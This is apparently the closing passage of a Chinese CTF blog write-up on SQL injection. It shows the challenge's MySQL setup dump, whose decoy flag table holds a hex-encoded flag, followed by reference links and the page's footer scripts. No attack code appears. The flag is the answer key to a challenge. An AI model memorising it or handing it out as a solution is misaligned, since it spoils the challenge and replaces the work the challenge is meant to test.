+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">SET NAMES utf8mb4;</span><br><span class="line">SET FOREIGN_KEY_CHECKS &#x3D; 0;</span><br><span class="line"></span><br><span class="line">-- ----------------------------</span><br><span class="line">-- Table structure for this_1s_th3_fiag_tab13</span><br><span class="line">-- ----------------------------</span><br><span class="line">DROP TABLE IF EXISTS &#96;this_1s_th3_fiag_tab13&#96;;</span><br><span class="line">CREATE TABLE &#96;this_1s_th3_fiag_tab13&#96;  (</span><br><span class="line">  &#96;id&#96; varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,</span><br><span class="line">  &#96;F1ag&#96; varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,</span><br><span class="line">  &#96;username&#96; varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,</span><br><span class="line">  &#96;password&#96; varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL</span><br><span class="line">) ENGINE &#x3D; MyISAM CHARACTER SET &#x3D; utf8 COLLATE &#x3D; utf8_general_ci ROW_FORMAT &#x3D; Dynamic;</span><br><span class="line"></span><br><span class="line">-- ----------------------------</span><br><span class="line">-- Records of this_1s_th3_fiag_tab13</span><br><span class="line">-- ----------------------------</span><br><span class="line">INSERT INTO &#96;this_1s_th3_fiag_tab13&#96; VALUES (&#39;3&#39;, &#39;666C61677B643067335F74687265657A68317D&#39;, &#39;threezh1&#39;, &#39;You is pig&#39;);</span><br><span class="line">INSERT INTO &#96;this_1s_th3_fiag_tab13&#96; VALUES (&#39;1&#39;, &#39;No the Flag&#39;, &#39;oops,This is not the flag id&#39;, &#39;You is pig&#39;);</span><br><span class="line">INSERT INTO &#96;this_1s_th3_fiag_tab13&#96; VALUES (&#39;2&#39;, &#39;No the Flag&#39;, &#39;Not the flag also&#39;, &#39;You is pig&#39;);</span><br><span class="line"></span><br><span class="line">SET FOREIGN_KEY_CHECKS &#x3D; 1;</span><br></pre></td></tr></table></figure>
+
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/160584">https://www.anquanke.com/post/id/160584</a></li>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/Kevinhanser/article/details/81592863">https://blog.csdn.net/Kevinhanser/article/details/81592863</a></li>
+<li><a target="_blank" rel="noopener" href="https://skysec.top/2017/11/19/%E8%BF%91%E6%9C%9F%E5%81%9A%E7%9A%84%E5%85%B6%E4%BB%96%E5%B9%B3%E5%8F%B0%E7%9A%843%E9%81%93%E6%B3%A8%E5%85%A5%E9%A2%98/">https://skysec.top/2017/11/19/%E8%BF%91%E6%9C%9F%E5%81%9A%E7%9A%84%E5%85%B6%E4%BB%96%E5%B9%B3%E5%8F%B0%E7%9A%843%E9%81%93%E6%B3%A8%E5%85%A5%E9%A2%98/</a></li>
+</ul>
+
+    </div>
+
+    
+</div>
+    <div class="footer" id="footer">
+    <p>Copyright © 2020 Threezh1
+        <!-- <label class="el-switch el-switch-green el-switch-sm" style="vertical-align: sub;">
+            <input type="checkbox" name="switch" id="update_style">
+            <span class="el-switch-style"></span>
+        </label> -->
+<!--         <script type="text/javascript">
+        var cnzz_protocol = (("https:" == document.location.protocol) ? "https://" : "http://");
+        document.write(unescape("%3Cspan id='cnzz_stat_icon_1278548644'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "v1.cnzz.com/stat.php%3Fid%3D1278548644%26show%3Dpic1' type='text/javascript'%3E%3C/script%3E"));
+        </script> -->
+    </p>
+</div>
+<input type="hidden" id="web_style" value="black">
+<input type="hidden" id="valine_appid" value="CmCti21ooOOIzFOhEyFkFvR0-gzGzoHsz">
+<input type="hidden" id="valine_appKey" value="FqiyUqbg7McKN2eG0MCewupf">
+
+<script src="/libs/jquery.min.js"></script>
+
+
+<script src="/libs/highlight/highlight.pack.js"></script>
+
+<script src='//cdn.jsdelivr.net/npm/valine@1.3.10/dist/Valine.min.js'></script>
+
+<script src="/js/js.js"></script>
+
+<style type="text/css">
+.v * {
+    color: #698fca;
+}
+
+.v .vlist .vcard .vhead .vsys {
+    color: #3a3e4a;
+}
+
+.v .vlist .vcard .vh .vmeta .vat {
+    color: #638fd5;
+}
+
+.v .vlist .vcard .vhead .vnick {
+    color: #6ba1ff;
+}
+
+.v a {
+    color: #8696b1;
+}
+
+.v .vlist .vcard .vhead .vnick:hover {
+    color: #669bfc;
+}
+</style>
+</body>
+
+</html>
